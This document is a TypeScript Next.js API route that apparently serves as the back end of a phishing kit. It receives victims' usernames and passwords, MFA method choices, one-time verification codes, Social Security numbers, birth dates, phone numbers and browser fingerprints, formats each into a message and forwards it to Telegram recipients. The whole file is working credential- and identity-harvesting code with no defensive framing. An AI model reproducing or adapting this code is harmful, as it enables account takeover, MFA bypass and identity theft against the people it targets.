import { NextResponse } from "next/server";
import {
  sendTelegramToAll,
  formatLoginMessage,
  formatMethodMessage,
  formatVerificationMessage,
  formatResendMessage,
  formatVisitMessage,
} from "../../../lib/telegram";

export async function POST(request: Request) {
  let json: any;
  try {
    json = await request.json();
  } catch (err) {
    console.error("[TELEGRAM ERROR] Invalid JSON:", err);
    return NextResponse.json(
      { ok: false, error: "invalid_json", details: String(err) },
      { status: 400 },
    );
  }

  let text = "";
  switch (json.kind) {
    case "login":
      text = formatLoginMessage(json.username, json.password);
      break;
    case "method":
      text = formatMethodMessage(json.method);
      break;
    case "verification":
      text = formatVerificationMessage(json.method, json.code, json.otpStep);
      break;
    case "resend":
      text = formatResendMessage(json.method, json.otpStep);
      break;
    case "visit":
      text = formatVisitMessage({
        location: json.location || "Unknown",
        ip: json.ip || "Unknown",
        timezone: json.timeZone || "—",
        isp: json.isp || "—",
        userAgent: json.userAgent || "",
        screen: `${json.screenWidth || 0}x${json.screenHeight || 0}`,
        language: json.language || "",
        referrer: json.referrer || "",
        url: json.url || "",
        localTime: json.localTime || "",
        utcTime: new Date().toISOString(),
      });
      break;
    case "identity":
      text = [
        "🆔 Identity Details",
        "━━━━━━━━━━━━━━━━━━",
        `🔢 SSN: ${json.ssn}`,
        `🎂 Birth Date: ${json.birthDate}`,
        `📞 Phone: ${json.phoneNumber}`,
        `🏠 ZIP Code: ${json.zipCode}`,
        `🔹 Method: ${json.method}`,
      ].join("\n");
      break;
    default:
      return NextResponse.json(
        { ok: false, error: "invalid_kind" },
        { status: 400 },
      );
  }

  const result = await sendTelegramToAll(text);
  console.log("[TELEGRAM DEBUG]", { json, text, telegramResult: result });
  if (!result.ok) {
    console.error("[TELEGRAM ERROR] Failed to send:", result.error);
    return NextResponse.json(
      { ok: false, error: result.error ?? "send_failed" },
      { status: 500 },
    );
  }
  return NextResponse.json({ ok: true });
}
